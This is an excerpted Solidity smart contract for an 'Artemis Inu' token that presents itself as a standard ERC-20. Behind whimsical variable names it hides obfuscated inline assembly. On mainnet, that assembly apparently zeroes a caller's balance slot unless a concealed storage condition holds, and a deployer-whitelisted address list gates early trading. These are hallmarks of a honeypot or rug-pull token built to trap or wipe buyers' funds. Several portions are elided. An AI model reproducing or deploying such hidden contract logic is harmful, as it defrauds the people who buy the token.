...
/*
“I will not have them punished," Artemis said. "I will have them rewarded."
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addRocket;
    uint256 private rocketLaunch = block.number*2;

    mapping (address => bool) private _firstEngine; 
    mapping (address => bool) private _secondLiftoff;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _rocketEngine;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private toMoon;
    address public pair;
    ...
    bool private trading; uint256 private nextStop = 1; bool private planetMars;
    uint256 private _decimals; uint256 private strangeSounds;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addRocket.push(_router); addRocket.push(msgSender_); addRocket.push(pair);
        for (uint256 q=0; q < 3;) {_firstEngine[addRocket[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xe68be6a11c6c3c58e5326616541e1d48cf58ee4a15f348442ecddaedaf360660
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x1cd0f3101bd1d43e2784672717b902a0aa9cd7a9533ff5f0f57992a85aedf622,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; rocketLaunch = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addRocket[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract ArtemisInu is ERC20Token {
    constructor() ERC20Token("Artemis Inu", "ARTEMI", msg.sender, 100000000 * 10 ** 18) {
    }
}